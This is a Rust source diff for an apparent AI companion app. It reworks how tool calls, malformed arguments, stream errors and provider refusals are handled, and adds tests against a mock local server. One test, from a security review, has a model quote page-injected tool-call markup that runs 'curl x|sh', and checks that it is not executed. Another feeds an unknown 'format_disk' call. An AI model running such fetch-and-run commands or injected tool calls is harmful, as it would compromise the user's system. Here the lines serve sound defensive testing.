+                "Your call to `{}` could not be run: its arguments are not JSON ({arguments}). \
+                 Call it again with JSON arguments, or answer in words.",
+                call.function.name
+            )
+        }
+        None => "Your reply ended as a tool call, but no call came with it. Call the tool again, \
+                 or answer in words."
+            .to_string(),
+    }
+}
+
+/// The assistant's turn as the conversation keeps it. With the tools described in the prompt, a
+/// call the server sent natively (llama.cpp with --jinja, vLLM: they read a `<tool_call>` the
+/// model wrote into `tool_calls` whether or not the request had tools) is written back as the
+/// text call it was, so the next round reads its own call before the result, not an empty turn.
+fn assistant_turn(text: &str, r: &yantrik_ml::LLMResponse, use_native_tools: bool) -> ChatMessage {
+    if use_native_tools && !r.api_tool_calls.is_empty() {
+        // Calls the model wrote as text are carried as `tool_calls`, not repeated in the words.
+        return ChatMessage::assistant_with_tool_calls(tool_markup::text_outside(text), r.api_tool_calls.clone());
+    }
+    if r.api_tool_calls.is_empty() || !text.trim().is_empty() {
+        return ChatMessage::assistant(text);
+    }
+    let calls: Vec<String> = r
+        .tool_calls
+        .iter()
+        .map(|c| {
+            let call = serde_json::json!({"name": c.name, "arguments": c.arguments});
+            format!("<tool_call>\n{call}\n</tool_call>")
+        })
+        .collect();
+    ChatMessage::assistant(calls.join("\n"))
+}
+
 /// Compute recall confidence from result scores.
 /// Returns (confidence, hint) where hint is a prompt instruction for low confidence.
 fn compute_recall_confidence(
@@ -4134,6 +4344,7 @@ fn execute_tool_round(
     native_tools: &mut Vec<serde_json::Value>,
     incognito: bool,
     model_family: ModelFamily,
+    model_tier: yantrik_ml::ModelTier,
 ) {
     let ctx = ToolContext {
         db,
@@ -4199,7 +4410,7 @@ fn execute_tool_round(
                     } else {
                         // For non-API: text-inject into system message
                         let tmpl = template_for_family(model_family);
-                        let new_text = tmpl.format_tools(&new_defs);
+                        let new_text = tmpl.format_tools_compact(&new_defs, model_tier);
                         if let Some(sys_msg) = messages.first_mut() {
                             sys_msg.content.push_str(&new_text);
                         }
@@ -4260,6 +4471,7 @@ fn execute_tool_round_tracked(
     policy_engine: &crate::policy_engine::PolicyEngine,
     trust_state: &crate::trust_model::TrustState,
     model_family: ModelFamily,
+    model_tier: yantrik_ml::ModelTier,
 ) {
     let agent_spawner_any = agent_spawner.map(|s| s as &dyn std::any::Any);
     let ctx = ToolContext {
@@ -4491,7 +4703,7 @@ fn execute_tool_round_tracked(
                         native_tools.extend(new_defs);
                     } else {
                         let tmpl = template_for_family(model_family);
-                        let new_text = tmpl.format_tools(&new_defs);
+                        let new_text = tmpl.format_tools_compact(&new_defs, model_tier);
                         if let Some(sys_msg) = messages.first_mut() {
                             sys_msg.content.push_str(&new_text);
                         }
@@ -5400,6 +5612,200 @@ mod identity_fact_tests {
 }
 
 #[cfg(test)]
+mod thought_without_answer_tests {
+    //! VM 542, 13 Oct 2026: a Qwen3 behind llama.cpp thought through the whole tool-turn budget
+    //! and sent no answer, and the Lens showed an empty bubble. The backend now calls that
+    //! [`ThoughtWithoutAnswer`]; here, the turn says so in words and is not taken for offline.
+
+    use super::*;
+    use yantrik_ml::LLMResponse;
+
+    /// A model that is reached and thinks until `max_tokens`, every time.
+    struct OnlyThinks;
+
+    impl LLMBackend for OnlyThinks {
+        fn chat(
+            &self,
+            _messages: &[ChatMessage],
+            _config: &GenerationConfig,
+            _tools: Option<&[serde_json::Value]>,
+        ) -> anyhow::Result<LLMResponse> {
+            Err(ThoughtWithoutAnswer { finish_reason: "length".into(), reasoning_chars: 3800 }.into())
+        }
+
+        fn chat_streaming(
+            &self,
+            messages: &[ChatMessage],
+            config: &GenerationConfig,
+            tools: Option<&[serde_json::Value]>,
+            _on_token: &mut dyn FnMut(&str),
+        ) -> anyhow::Result<LLMResponse> {
+            self.chat(messages, config, tools)
+        }
+
+        fn count_tokens(&self, text: &str) -> anyhow::Result<usize> {
+            Ok(text.len())
+        }
+
+        fn backend_name(&self) -> &str {
+            "only-thinks"
+        }
+    }
+
+    fn companion() -> CompanionService {
+        let db = YantrikDB::new(":memory:", 384).expect("in-memory database");
+        let mut config = CompanionConfig::default();
+        config.tools.enabled = false;
+        CompanionService::new(db, std::sync::Arc::new(OnlyThinks), config)
+    }
+
+    #[test]
+    fn a_turn_the_model_only_thought_about_shows_the_failure_in_words() {
+        let mut c = companion();
+        let mut shown = String::new();
+        let reply = c.handle_message_streaming("Make a note called Groceries with milk, eggs and bread", |t| {
+            if t == "__REPLACE__" {
+                shown.clear();
+            } else {
+                shown.push_str(t);
+            }
+        });
+        assert_eq!(shown, THOUGHT_WITHOUT_ANSWER, "the bubble says what happened");
+        assert_eq!(reply.message, THOUGHT_WITHOUT_ANSWER);
+        assert!(reply.model_failure.as_deref().unwrap_or("").contains("length"), "{:?}", reply.model_failure);
+        assert!(!reply.offline_mode, "the model was reached: this is not the offline responder");
+    }
+
+    #[test]
+    fn the_same_holds_without_streaming() {
+        let reply = companion().handle_message("Make a note called Groceries with milk, eggs and bread");
+        assert_eq!(reply.message, THOUGHT_WITHOUT_ANSWER);
+        assert!(reply.model_failure.is_some() && !reply.offline_mode);
+    }
+}
+
+#[cfg(test)]
+mod stream_error_tests {
+    //! VM 542, 15 Oct 2026: the first run's "Can it answer?" got "I'm here. How can I help?" to
+    //! "Use the calculate tool to work out 17 times 23". The model's server had sent
+    //! `data: {"error": {"message": "malformed tool call: …"}}` inside the streamed reply, and the
+    //! reply ended empty. The backend now calls that [`yantrik_ml::StreamError`]; here, the turn
+    //! says what the server said and is not taken for offline.
+
+    use super::*;
+    use yantrik_ml::{LLMResponse, StreamError};
+
+    const SAID: &str = "malformed tool call: {\"name\": \"calculate\", \"arguments\": {\"expression\": \"17 * 23\"}}";
+
+    /// A model whose every call fails with the error `.0` makes: by default a server that answers
+    /// 200 and then reports an error inside the stream.
+    struct ServerRefuses(fn() -> anyhow::Error);
+
+    fn mid_stream() -> anyhow::Error {
+        StreamError { message: SAID.into() }.into()
+    }
+
+    impl LLMBackend for ServerRefuses {
+        fn chat(
+            &self,
+            _messages: &[ChatMessage],
+            _config: &GenerationConfig,
+            _tools: Option<&[serde_json::Value]>,
+        ) -> anyhow::Result<LLMResponse> {
+            Err((self.0)())
+        }
+
+        fn chat_streaming(
+            &self,
+            messages: &[ChatMessage],
+            config: &GenerationConfig,
+            tools: Option<&[serde_json::Value]>,
+            _on_token: &mut dyn FnMut(&str),
+        ) -> anyhow::Result<LLMResponse> {
+            self.chat(messages, config, tools)
+        }
+
+        fn count_tokens(&self, text: &str) -> anyhow::Result<usize> {
+            Ok(text.len())
+        }
+
+        fn backend_name(&self) -> &str {
+            "server-refuses"
+        }
+    }
+
+    fn companion() -> CompanionService {
+        failing_with(mid_stream)
+    }
+
+    fn failing_with(error: fn() -> anyhow::Error) -> CompanionService {
+        let db = YantrikDB::new(":memory:", 384).expect("in-memory database");
+        let mut config = CompanionConfig::default();
+        config.tools.enabled = false;
+        CompanionService::new(db, std::sync::Arc::new(ServerRefuses(error)), config)
+    }
+
+    /// VM 542, 16 Oct 2026, as Anthropic's endpoint said it.
+    fn claude_refuses() -> anyhow::Error {
+        let body = r#"{"error":{"code":"invalid_request_error","message":"`temperature` is deprecated for this model."}}"#;
+        yantrik_ml::ProviderRefused::of(400, "https://api.anthropic.com/v1", body, None).unwrap().into()
+    }
+
+    #[test]
+    fn a_request_the_provider_refused_says_the_providers_reason_and_is_not_offline() {
+        for streaming in [true, false] {
+            let mut c = failing_with(claude_refuses);
+            let ask = "What's on my calendar?";
+            let reply = if streaming { c.handle_message_streaming(ask, |_| {}) } else { c.handle_message(ask) };
+            let reason = "Claude refused the request: `temperature` is deprecated for this model";
+            assert!(reply.message.starts_with(reason), "{}", reply.message);
+            assert_eq!(reply.model_failure.as_deref(), Some(reason));
+            assert!(!reply.offline_mode, "the model was reached: this is not the offline responder");
+            // The person reads the provider's words; the model's history never holds them.
+            let said = c.conversation_history.last().expect("the turn is in the history");
+            assert_eq!(said.content, FAILED_TURN, "streaming: {streaming}");
+            assert!(c.conversation_history.iter().all(|m| !m.content.contains("temperature")));
+        }
+    }
+
+    #[test]
+    fn a_model_that_could_not_be_reached_is_offline_and_says_why() {
+        fn unreachable() -> anyhow::Error {
+            anyhow::anyhow!("API request failed: connection refused")
+        }
+        let reply = failing_with(unreachable).handle_message_streaming("What's on my calendar?", |_| {});
+        assert!(reply.offline_mode, "the offline responder answered");
+        assert_eq!(reply.model_failure.as_deref(), Some("API request failed: connection refused"));
+    }
+
+    #[test]
+    fn a_reply_the_server_ended_with_an_error_says_what_the_server_said() {
+        let mut c = companion();
+        let mut shown = String::new();
+        let reply = c.handle_message_streaming("Use the calculate tool to work out 17 times 23, and tell me the result.", |t| {
+            if t == "__REPLACE__" {
+                shown.clear();
+            } else {
+                shown.push_str(t);
+            }
+        });
+        let expected = yantrik_ml::stream_error::said(&StreamError { message: SAID.into() });
+        assert_eq!(shown, expected, "the bubble says what happened");
+        assert_eq!(reply.message, expected);
+        assert_ne!(reply.message, "I'm here. How can I help?");
+        assert!(reply.model_failure.as_deref().unwrap_or("").contains("malformed tool call"), "{:?}", reply.model_failure);
+        assert!(!reply.offline_mode, "the model was reached: this is not the offline responder");
+    }
+
+    #[test]
+    fn the_same_holds_without_streaming() {
+        let reply = companion().handle_message("Use the calculate tool to work out 17 times 23, and tell me the result.");
+        assert!(reply.message.contains("malformed tool call"), "{}", reply.message);
+        assert!(reply.model_failure.is_some() && !reply.offline_mode);
+    }
+}
+
+#[cfg(test)]
 mod bond_scoring_tests {
     //! The bond is the person's relationship with Yantrik. The startup brief, an EXECUTE urge
     //! and "Reflect naturally" go through the same handlers as the person's words, and the
@@ -5927,6 +6333,23 @@ mod recipe_placeholder_tests {
         c
     }
 
+    /// The not-set-up sentence is the desktop's, not a model's: a first run that counted it as
+    /// an answer would say "You're ready." with nothing set up.
+    #[test]
+    fn the_not_set_up_reply_is_marked_as_no_model() {
+        let db = YantrikDB::new(":memory:", 64).expect("in-memory database");
+        let mut c = CompanionService::new(
+            db,
+            std::sync::Arc::new(yantrik_ml::not_set_up::NotSetUpLLM),
+            CompanionConfig::default(),
+        );
+        let r = c.handle_message("hi");
+        assert_eq!(r.message, yantrik_ml::not_set_up::NOT_SET_UP);
+        assert!(r.without_model);
+        let r = c.streaming_turn("hi", |_| {}, false);
+        assert!(r.without_model);
+    }
+
     fn tool_step(tool: &str, args: serde_json::Value, store_as: &str) -> RecipeStep {
         RecipeStep::Tool {
             tool_name: tool.into(),
@@ -6158,5 +6581,318 @@ mod vault_audit_tests {
             assert!(!catalog.contains(hidden), "the outside catalogue shows {hidden}");
         }
         assert!(catalog.contains("calculate"));
+    }
+}
+
+#[cfg(test)]
+mod native_tool_reply_tests {
+    //! VM 542, 14 Oct 2026: the first run asked the companion to use `calculate` for 17 times 23
+    //! and got an empty answer. The model, a Qwen3 behind a llama.cpp server, was on the medium
+    //! tier with the tools described in the prompt, so the request carried no `tools`; the server
+    //! answered with a native `tool_calls` reply all the same. Here the recorded stream is served
+    //! from a local port to a real [`yantrik_ml::ApiLLM`], set up the way the first run sets it up.
+
+    use std::io::{BufRead as _, BufReader, Read as _, Write as _};
+    use std::net::TcpListener;
+    use std::sync::{Arc, Mutex};
+
+    use super::*;
+
+    const MODEL: &str = "qwen3.8-flash-next-unsloth-ud-iq4_xs";
+    const NATIVE_CALL: &str = include_str!("../../yantrik-ml/src/llm/testdata/qwen3_native_tool_call.sse");
+    const ASK: &str = "Use the calculate tool to work out 17 times 23, and tell me the result.";
+
+    type Requests = Arc<Mutex<Vec<serde_json::Value>>>;
+
+    /// A server on a local port that answers each request with `reply(request)` (a content type
+    /// and a body) and keeps every request body it was sent.
+    fn server(reply: impl Fn(&serde_json::Value) -> (&'static str, String) + Send + 'static) -> (String, Requests) {
+        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
+        let url = format!("http://{}/v1", listener.local_addr().unwrap());
+        let seen = Arc::new(Mutex::new(Vec::new()));
+        let kept = seen.clone();
+        std::thread::spawn(move || {
+            while let Ok((mut conn, _)) = listener.accept() {
+                let mut reader = BufReader::new(conn.try_clone().unwrap());
+                let mut length = 0usize;
+                loop {
+                    let mut line = String::new();
+                    reader.read_line(&mut line).unwrap();
+                    if line == "\r\n" || line.is_empty() {
+                        break;
+                    }
+                    if let Some(v) = line.to_ascii_lowercase().strip_prefix("content-length:") {
+                        length = v.trim().parse().unwrap();
+                    }
+                }
+                let mut request = vec![0u8; length];
+                reader.read_exact(&mut request).unwrap();
+                let request: serde_json::Value = serde_json::from_slice(&request).unwrap();
+                let (kind, body) = match reply(&request) {
+                    ("application/json", body) if request["stream"] == true => ("text/event-stream", as_stream(&body)),
+                    other => other,
+                };
+                kept.lock().unwrap().push(request);
+                let head = format!(
+                    "HTTP/1.1 200 OK\r\nContent-Type: {kind}\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",
+                    body.len()
+                );
+                conn.write_all(head.as_bytes()).unwrap();
+                conn.write_all(body.as_bytes()).unwrap();
+            }
+        });
+        (url, seen)
+    }
+
+    /// A whole reply as the server streams it: the words, the calls, then the finish reason.
+    fn as_stream(body: &str) -> String {
+        let reply: serde_json::Value = serde_json::from_str(body).unwrap();
+        let message = &reply["choices"][0]["message"];
+        let mut calls = message["tool_calls"].clone();
+        for (i, call) in calls.as_array_mut().into_iter().flatten().enumerate() {
+            call["index"] = serde_json::json!(i);
+        }
+        let deltas = [
+            serde_json::json!({"choices": [{"delta": {"content": message["content"]}}]}),
+            serde_json::json!({"choices": [{"delta": {"tool_calls": calls}}]}),
+            serde_json::json!({"choices": [{"delta": {}, "finish_reason": reply["choices"][0]["finish_reason"]}]}),
+        ];
+        deltas.iter().map(|d| format!("data: {d}\n\n")).collect::<String>() + "data: [DONE]\n\n"
+    }
+
+    fn last_user_words(request: &serde_json::Value) -> String {
+        request["messages"].as_array().unwrap().iter().rev()
+            .find(|m| m["role"] == "user" || m["role"] == "tool")
+            .and_then(|m| m["content"].as_str())
+            .unwrap_or("")
+            .to_string()
+    }
+
+    fn words(text: &str) -> (&'static str, String) {
+        let reply = serde_json::json!({
+            "choices": [{"message": {"role": "assistant", "content": text}, "finish_reason": "stop"}],
+        });
+        ("application/json", reply.to_string())
+    }
+
+    fn native_call(name: &str, arguments: &str) -> (&'static str, String) {
+        let reply = serde_json::json!({
+            "choices": [{"message": {"role": "assistant", "content": "", "tool_calls": [
+                {"id": "call_1", "type": "function", "function": {"name": name, "arguments": arguments}}
+            ]}, "finish_reason": "tool_calls"}],
+        });
+        ("application/json", reply.to_string())
+    }
+
+    /// The llama-server VM 542 found: the turn's first, streamed, request gets the recorded
+    /// native call, and a later one that carries the tool's result is answered from it.
+    fn the_vms_server(request: &serde_json::Value) -> (&'static str, String) {
+        if request["stream"] == true {
+            return ("text/event-stream", NATIVE_CALL.to_string());
+        }
+        let last = last_user_words(request);
+        if last.contains("391") { words("17 times 23 is 391.") } else { words("Noted.") }
+    }
+
+    /// The companion as a fresh install has it after the first run: started with no model
+    /// chosen, then given the one the first run found on the LAN.
+    fn companion(url: String) -> CompanionService {
+        let db = YantrikDB::new(":memory:", 384).expect("in-memory database");
+        let mut c = CompanionService::new(db, Arc::new(yantrik_ml::not_set_up::NotSetUpLLM), CompanionConfig::default());
+        c.swap_llm(Arc::new(yantrik_ml::ApiLLM::new(url, None, MODEL).for_provider("llamacpp")));
+        assert_eq!(c.capability_profile.tier, yantrik_ml::ModelTier::Medium);
+        // Since 16 Oct 2026 the swap gives a Qwen behind an API native tools, as start-up always
+        // did. These tests keep the case the VM met on 14 Oct: tools described in the prompt and
+        // a server that answers with native calls all the same.
+        assert!(c.use_native_tools, "the swap follows the new backend");
+        c.use_native_tools = false;
+        c
+    }
+
+    /// The companion as VM 542 had it on 16 Oct 2026: started with no model chosen, then given
+    /// Claude in Settings (served here from a local port), with its tools on.
+    fn on_claude(url: String) -> CompanionService {
+        let db = YantrikDB::new(":memory:", 384).expect("in-memory database");
+        let mut config = CompanionConfig::default();
+        config.tools.enabled = true;
+        let mut c = CompanionService::new(db, Arc::new(yantrik_ml::not_set_up::NotSetUpLLM), config);
+        assert!(!c.use_native_tools && !c.tools_system_message.is_empty(), "start-up describes the tools");
+        c.swap_llm(Arc::new(yantrik_ml::ApiLLM::new(url, None, "claude-sonnet-5-5").for_provider("anthropic")));
+        c
+    }
+
+    #[test]
+    fn a_swap_to_claude_gives_native_tools_only_and_a_swap_back_describes_them_again() {
+        let mut c = on_claude("http://127.0.0.1:9/v1".into());
+        assert_eq!(c.capability_profile.family, yantrik_ml::ModelFamily::Anthropic);
+        assert!(c.use_native_tools, "Claude gets native tools");
+        assert!(c.tools_system_message.is_empty(), "and no tools described in the prompt");
+        assert!(!c.native_core_tools.is_empty());
+
+        c.swap_llm(Arc::new(yantrik_ml::not_set_up::NotSetUpLLM));
+        assert!(!c.use_native_tools && !c.tools_system_message.is_empty(), "the prompt follows the backend back");
+    }
+
+    #[test]
+    fn claude_can_call_a_tool_and_then_answer() {
+        let c = on_claude("http://127.0.0.1:9/v1".into());
+        let rounds = c.config.agent.max_steps.min(c.capability_profile.max_agent_steps).max(3);
+        assert!(c.capability_profile.max_agent_steps > 1 && rounds > 1, "a call and then an answer: {rounds}");
+    }
+
+    const CLAUDE_CALL: &str =
+        "<invoke name=\"calculate\">\n<parameter name=\"expression\">17 * 23</parameter>\n</invoke>";
+
+    #[test]
+    fn a_call_claude_writes_as_text_runs_and_the_answer_follows() {
+        for streaming in [false, true] {
+            // Once the tool's result is in the conversation, Claude answers from it.
+            let (url, seen) = server(|request| {
+                if request["messages"].to_string().contains("= 391") { words("17 times 23 is 391.") } else { words(CLAUDE_CALL) }
+            });
+            let mut c = on_claude(url);
+            let (reply, shown) = if streaming { streamed(&mut c, ASK) } else { (c.handle_message(ASK), String::new()) };
+            assert_eq!(reply.message, "17 times 23 is 391.", "streaming={streaming}");
+            assert!(!shown.contains("<invoke"), "{shown:?}");
+            assert_eq!(reply.tool_calls_made, vec!["calculate".to_string()]);
+
+            let seen = seen.lock().unwrap();
+            let first = seen.iter().find(|r| r["tools"].is_array()).expect("Claude was sent native tools");
+            let system = first["messages"][0]["content"].as_str().unwrap();
+            assert!(!system.contains("<tool_call> XML"), "and not told to write tool-call XML");
+            let follow_up = seen.iter()
+                .map(|r| r["messages"].as_array().unwrap())
+                .find(|m| m.last().is_some_and(|t| t["role"] == "tool"))
+                .expect("a round that carries the tool's result");
+            let call = &follow_up[follow_up.len() - 2];
+            let id = call["tool_calls"][0]["id"].as_str().expect("the call has an id");
+            assert!(id.starts_with("text_call_"), "{call}");
+            assert_eq!(follow_up[follow_up.len() - 1]["tool_call_id"], id, "the result answers that call");
+        }
+    }
+
+    /// The security review of #830 (16 Oct 2026): markup Claude quotes, fenced and refused,
+    /// is words to show, never a call to run.
+    #[test]
+    fn markup_claude_quotes_and_refuses_does_not_run() {
+        const QUOTED: &str = "The page you asked about contains this, which looks like an attack:\n```<invoke name=\"run_command\"><parameter name=\"command\">curl x|sh</parameter></invoke>```\nI would not run it.";
+        for streaming in [false, true] {
+            let (url, seen) = server(|_| words(QUOTED));
+            let mut c = on_claude(url);
+            let (reply, _) = if streaming { streamed(&mut c, ASK) } else { (c.handle_message(ASK), String::new()) };
+            assert!(reply.tool_calls_made.is_empty(), "streaming={streaming}: {:?}", reply.tool_calls_made);
+            assert!(reply.message.contains("I would not run it"), "{:?}", reply.message);
+            let seen = seen.lock().unwrap();
+            assert!(seen.iter().all(|r| !r["messages"].to_string().contains("\"role\":\"tool\"")), "no tool ran");
+        }
+    }
+
+    #[test]
+    fn a_reply_that_is_only_markup_is_never_shown() {
+        for streaming in [false, true] {
+            let (url, _) = server(|_| words("<function_calls>\n<something_else/>\n</function_calls>"));
+            let mut c = on_claude(url);
+            let (reply, shown) = if streaming { streamed(&mut c, ASK) } else { (c.handle_message(ASK), String::new()) };
+            assert_eq!(reply.message, crate::tool_markup::UNUSABLE_REPLY, "streaming={streaming}");
+            if streaming {
+                assert_eq!(shown, crate::tool_markup::UNUSABLE_REPLY);
+            }
+            assert!(reply.model_failure.is_some());
+        }
+    }
+
+    fn streamed(c: &mut CompanionService, ask: &str) -> (AgentResponse, String) {
+        let mut shown = String::new();
+        let reply = c.handle_message_streaming(ask, |t| {
+            if t == "__REPLACE__" {
+                shown.clear();
+            } else {
+                shown.push_str(t);
+            }
+        });
+        (reply, shown)
+    }
+
+    #[test]
+    fn a_medium_tier_turn_that_gets_a_native_call_runs_the_tool_and_answers_with_the_result() {
+        let (url, seen) = server(the_vms_server);
+        let mut c = companion(url);
+        let (reply, shown) = streamed(&mut c, ASK);
+        assert!(reply.message.contains("391"), "{:?}", reply.message);
+        assert!(shown.contains("391"), "the bubble shows the answer: {shown:?}");
+        assert_eq!(reply.tool_calls_made, vec!["calculate".to_string()]);
+        assert!(reply.model_failure.is_none() && !reply.offline_mode);
+
+        let seen = seen.lock().unwrap();
+        assert!(seen.iter().all(|r| r.get("tools").is_none()), "no request carried tools");
+        let follow_up = seen.iter().find(|r| r["stream"] == false).expect("a round after the tool ran");
+        let turns = follow_up["messages"].as_array().unwrap();
+        let call = &turns[turns.len() - 2];
+        assert_eq!(call["role"], "assistant");
+        assert!(
+            call["content"].as_str().unwrap().contains("\"name\":\"calculate\""),
+            "the next round reads its own call, not an empty turn: {call}"
+        );
+        assert!(last_user_words(follow_up).contains("17 * 23 = 391"), "{}", last_user_words(follow_up));
+    }
+
+    #[test]
+    fn the_same_holds_without_streaming() {
+        let (url, _) = server(|request| {
+            let last = last_user_words(request);
+            if last.contains("391") { words("17 times 23 is 391.") } else { native_call("calculate", r#"{"expression": "17 * 23"}"#) }
+        });
+        let reply = companion(url).handle_message(ASK);
+        assert!(reply.message.contains("391"), "{:?}", reply.message);
+        assert_eq!(reply.tool_calls_made, vec!["calculate".to_string()]);
+    }
+
+    #[test]
+    fn a_native_call_that_cannot_be_read_is_asked_again_and_not_shown_as_an_empty_answer() {
+        let (url, seen) = server(|request| {
+            let last = last_user_words(request);
+            if last.contains("391") {
+                words("17 times 23 is 391.")
+            } else if last.contains("could not be run") {
+                native_call("calculate", r#"{"expression": "17 * 23"}"#)
+            } else {
+                native_call("calculate", r#"{"expression": 17 * 23}"#)
+            }
+        });
+        let mut c = companion(url);
+        let (reply, shown) = streamed(&mut c, ASK);
+        assert!(reply.message.contains("391") && shown.contains("391"), "{shown:?}");
+        let seen = seen.lock().unwrap();
+        assert!(
+            seen.iter().any(|r| last_user_words(r).contains("its arguments are not JSON")),
+            "the model was told why its call did not run"
+        );
+    }
+
+    #[test]
+    fn a_model_whose_calls_can_never_be_read_ends_the_turn_in_words() {
+        let (url, _) = server(|_| native_call("calculate", "{not json"));
+        let mut c = companion(url);
+        let (reply, shown) = streamed(&mut c, ASK);
+        assert_eq!(shown, UNREAD_TOOL_CALL, "never an empty bubble");
+        assert_eq!(reply.message, UNREAD_TOOL_CALL);
+        assert!(reply.model_failure.is_some() && !reply.offline_mode);
+
+        let (url, _) = server(|_| native_call("calculate", "{not json"));
+        let reply = companion(url).handle_message(ASK);
+        assert_eq!(reply.message, UNREAD_TOOL_CALL);
+        assert!(reply.model_failure.is_some());
+    }
+
+    #[test]
+    fn a_native_call_to_a_tool_the_companion_does_not_have_is_refused_as_before() {
+        let (url, seen) = server(|request| {
+            let last = last_user_words(request);
+            if last.contains("Unknown tool") { words("I can't do that.") } else { native_call("format_disk", "{}") }
+        });
+        let reply = companion(url).handle_message(ASK);
+        assert_eq!(reply.message, "I can't do that.");
+        let seen = seen.lock().unwrap();
+        assert!(seen.iter().any(|r| last_user_words(r).contains("Unknown tool: format_disk")));
     }
 }
